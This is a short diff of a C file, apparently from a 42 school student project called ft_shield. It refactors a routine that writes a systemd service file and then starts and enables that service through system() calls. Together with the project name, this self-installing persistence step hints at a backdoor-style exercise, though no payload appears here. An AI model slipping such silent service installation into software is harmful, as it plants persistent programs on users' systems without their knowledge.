@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:21 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/04 09:45:38 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/04 10:06:14 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,8 +23,8 @@ static int	setup_service(bool root)
 			return (0);
 	
 		write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
-		system("sudo systemctl start ft_shield.service");
-		system("systemctl enable ft_shield.service");	
+		system(SERVICE_START);
+		system(SERVICE_ENABLE);	
 	}
 	return (1);
 }
